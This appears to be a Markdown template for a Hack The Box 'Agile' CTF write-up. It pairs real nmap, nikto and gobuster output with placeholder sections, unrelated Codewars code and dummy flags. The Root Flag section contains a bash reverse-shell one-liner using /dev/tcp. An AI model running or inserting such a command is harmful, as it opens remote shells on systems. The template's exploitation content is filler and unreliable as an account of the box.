---
title: "Hack The Box - Agile"
author: Ilyass Elannid
date: 2023-03-16
subject: "CTF Writeup"
keywords: [HTB, CTF, Hack The Box, Security]
lang: "en"
titlepage: true
title-page-color: "141d2b"
titlepage-rule-color: "11b925"
titlepage-text-color: "FFFFFF"
toc: true
toc-own-page: true
titlepage-background: ""
collection: writeups
permalink: /writeups/HTB-Agile
excerpt: 'This is a free boot2root machine on HackTheBox.'
...

![header](/images/agile.png)

**Link to the machine:** [Agile](https://app.hackthebox.com/machines/agile)

---


# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
$ nmap -A 10.10.11.203 -T4        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 09:43 EDT
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.42 seconds
```
From the above output we can see that ports, **22** and **80** are the ports open.

## Nikto

```console
$ nikto -host 10.10.11.203                                                                                   1 ⨯
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.203
+ Target Hostname:    10.10.11.203
+ Target Port:        80
+ Start Time:         2023-03-16 09:55:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://superpass.htb
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ 8074 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-03-16 10:17:43 (GMT-4) (1361 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nothing interesting except that the server uses an outdated version of nginx.

## Gobuster
### Subdirectories:
Since we have a website then we scan the target for subdirectories.

```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u superpass.htb -t 80
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://superpass.htb
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/16 09:59:28 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 302) [Size: 249] [--> /account/login?next=%2Fdownload]
/static               (Status: 301) [Size: 178] [--> http://superpass.htb/static/]
/vault                (Status: 302) [Size: 243] [--> /account/login?next=%2Fvault]
Progress: 220470 / 220561 (99.96%)
===============================================================
2023/03/16 10:12:55 Finished
===============================================================

```
We found 3 subdirectories for the moment, none of whoch seems interesting as they all redirect to a login page or lead to an error, we can re-check those which require a login later if we succeed to do so.

Let's surf the website.

![My Website](../images/agile1.png)

\ **Figure 1:** My Website

After some clicking and navigation I found a page that allows to register a new user, store some passwords and then export those to a downloadable pdf file.

![Github](../images/agile2.png)

\ **Figure 2:** Github Profile


![Github](../images/agile3.png)

\ **Figure 2:** Github Profile

The first normal reaction that would come to anyones mind is to intercept the download request and mess a little bit with its content in order to achieve an LFI attack. But Let's not rush that and do more reconnaissance. We'll run gobuster again to see if there are any hidden pages we can access.

Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
3. [https://hackthebox.eu](https://hackthebox.eu)
4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)